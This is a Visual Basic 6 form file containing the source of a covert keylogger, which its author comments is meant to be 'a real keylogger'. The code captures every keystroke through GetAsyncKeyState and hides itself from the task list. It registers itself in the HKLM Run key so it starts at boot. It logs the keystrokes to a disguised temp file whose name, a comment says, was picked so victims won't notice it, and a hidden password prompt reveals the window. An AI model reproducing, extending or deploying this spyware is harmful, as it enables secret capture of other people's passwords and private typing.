VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Just Simple Things"
   ClientHeight    =   5385
   ClientLeft      =   2490
   ClientTop       =   1725
   ClientWidth     =   6675
   Icon            =   "KeyLoggerEasy.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5385
   ScaleWidth      =   6675
   Begin VB.CommandButton Command4 
      Caption         =   "Open the File"
      Height          =   330
      Left            =   270
      TabIndex        =   5
      Top             =   390
      Width           =   1455
   End
   Begin VB.Timer Timer2 
      Interval        =   60000
      Left            =   5385
      Top             =   3810
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Exit"
      Height          =   345
      Left            =   4905
      TabIndex        =   3
      Top             =   375
      Width           =   1365
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Save to File"
      Height          =   345
      Left            =   3420
      TabIndex        =   2
      Top             =   390
      Width           =   1365
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Clear text"
      Height          =   345
      Left            =   1890
      TabIndex        =   1
      Top             =   375
      Width           =   1365
   End
   Begin VB.TextBox Text1 
      Height          =   4380
      Left            =   180
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   810
      Width           =   6405
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   3930
      Top             =   885
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "Press F10 to Hide this box :::  Press F11 to open Password Box"
      Height          =   195
      Left            =   420
      TabIndex        =   6
      Top             =   60
      Width           =   4455
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Default text saving file name is ... C:\WINDOWSTEMP\INSTLOJAKI.TMP"
      Height          =   195
      Left            =   375
      TabIndex        =   4
      Top             =   5220
      Width           =   5265
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
''''''''''''''''THIS IS BASED ON SOME OTHERS A SAMPLE CODE,THANKS TO HIM'''''''''''
'i 'm working on a real keylogger, and I was researching how to do them, and after a bit of thinking I came up with this code... it works for a very very basic keylogger, but you'll get tons of unwanted weird characters in your text, so you have to do a lot of modification if you want to use this for a good quality keylogger (like I am).
'Just create a timer and a textbox on your form, leave their names as Text1 and Timer1. Set the timer's interval to 1 and make sure it's activated. Copy this code to your form.

Dim result As Integer
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer

'=====================================================================
'REG KEY CONSTANTS
Private Const HKEY_CURRENT_USER = &H80000001
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const KEY_WRITE = &H20006
Private Const REG_SZ = 1
'END REG KEYS

'REGISTRY FUNCTIONS
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" _
(ByVal hKey As Long, ByVal lpSubKey As String, _
ByVal ulOptions As Long, _
ByVal samDesired As Long, _
phkResult As Long) As Long

Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, _
ByVal Reserved As Long, _
ByVal dwType As Long, _
lpData As Any, _
ByVal cbData As Long) As Long

' Call SetBoot(HKEY_LOCAL_MACHINE, "Jaki", App.Path & "\" & App.EXEName & ".exe", "Software\Microsoft\Windows\CurrentVersion\Run")
 '08749274240
Private Sub SetBoot(ByVal hKey As Long, ByVal MKey As String, ByVal stringKeyVal As String, ByVal subkey As String)
Dim HRKey As Long, StrB As String
Dim retval As Long
retval = RegOpenKeyEx(hKey, subkey, 0, KEY_WRITE, HRKey)
If retval <> 0 Then
Exit Sub
End If
StrB = stringKeyVal & vbNullChar
retval = RegSetValueEx(HRKey, MKey, 0, REG_SZ, ByVal StrB, Len(StrB))
RegCloseKey HRKey
End Sub
Private Sub Command1_Click()
Text1.Text = ""
End Sub
Private Sub Command2_Click()
Call SaveToFile
End Sub

Private Sub Command3_Click()
Call SaveToFile
Unload Me
End Sub

Private Sub Command4_Click()
Shell "C:\WINDOWS\NOTEPAD.EXE C:\WINDOWS\TEMP\INSTLOJAKI.TMP", vbNormalFocus
'
End Sub

Private Sub Form_Load()
'CHECKS FIRST WEATHER APPLICATION ALREADY RUNNING
If App.PrevInstance = True Then End
'HIDES THE APPLICATION FROM 'CTRL-ALT-DEL ' TASK LIST .
App.TaskVisible = False
' HIDES THE APPLICATION
Call SetBoot(HKEY_LOCAL_MACHINE, "Jaki", App.Path & "\" & App.EXEName & ".exe", "Software\Microsoft\Windows\CurrentVersion\Run")
'sets the application in start up! ***'IMP'*** change the parameter """ app.path &"\" &app.exename& ".exe" ""
' With the application exe path, if  exe in another location.
Me.Visible = False
End Sub
Private Sub Form_Terminate()
Call SaveToFile
End Sub
' This saves the text in textbox to a file., intially the filename is 'INSTLOJAKI.TMP'(the name is not stright because no one thinks its a hacked text file!,so they don't open even they see it!)

Private Sub SaveToFile()
On Error Resume Next
If Dir("c:\Windows\temp\instlojaki.tmp") = "" Then
    Open "c:\Windows\temp\INSTLOJAKI.TMP" For Output As #1
    Print #1, "line1"
    Close #1
End If

filenameis = "c:\Windows\temp\INSTLOJAKI.TMP"
'if filesize grater than 600kb then saves it to another file name,

If FileLen("c:\Windows\temp\INSTLOJAKI.TMP") > 604800 Then
'the otherfile name will be defined at runtime only
FilenoIs = Rnd * 4000
filenameis = "c:\Windows\temp\INSTLOJAKI" & FilenoIs * ".TMP"
FileCopy "C:\WINDOWS\TEMP\INSTLOJAKI.TMP", filenameis
Kill "c:\Windows\temp\INSTLOJAKI.TMP"
End If
'SAVES THE TEXT IN TEXT BOX TO FILE
Open "c:\Windows\temp\INSTLOJAKI.TMP" For Append As #1
Print #1, Text1.Text
Close #1
'Text1.Text = ""
End Sub

Private Sub Form_Unload(Cancel As Integer)
'SAVES THE THINGS TO FILE WHEN APPLICATION IS BEING CLOSED,(LIKE SHUTDOWN,RESTART,ETC)
Call SaveToFile
End Sub

Private Sub Timer1_Timer()
'THIS IS ACTUAL KEY FINDING
' SOME ASCII OR USED FOR WINDOWS FUNCTION KEYS, TO STORE TEXT IN TEXTBOX
Call Timer2_Timer
For i = 1 To 255
result = 0
result = GetAsyncKeyState(i)

If result = -32767 Then
If i > 47 And i < 58 Then Text1.Text = Text1.Text + Chr(i)
If i > 64 And i < 91 Then Text1.Text = Text1.Text + Chr(i)
If i = 189 Then Text1.Text = Text1.Text & "_"
If i = 32 Then Text1.Text = Text1.Text & " "
If i = 190 Then Text1.Text = Text1.Text & "."
If i = 191 Then Text1.Text = Text1.Text & "/"
'If i = 35 Then Text1.Text = Text1.Text + Chr(13) & vbCrLf
If i = 13 Then Text1.Text = Text1.Text & Chr(13) & vbCrLf
If i = 9 Then Text1.Text = Text1.Text & " "
If i = 95 Then Text1.Text = Text1.Text & "_"
' HIDES THE APPLICATION WHEN YOU PRESS "F10" ON KEYBOARD
If i = 121 Then Me.Visible = False
' THIS WILL BE RAISED WHEN YOU PRESS "F11" ON KEYBOARD.
If i = 122 Then strs = InputBox("What to do ?", "WEB ETERNITY", "Nothing!")
If LCase(strs) = "chandu" Then Me.Show
Debug.Print i
End If
Next i
End Sub

Private Sub Timer2_Timer()
'SAVES THE TEXT TO FILE FOR EVERY 10 MINUTES
Static CountM
CountM = CountM + 1
If CountM = 10 Then Call SaveToFile: Text1.Text = ""
End Sub
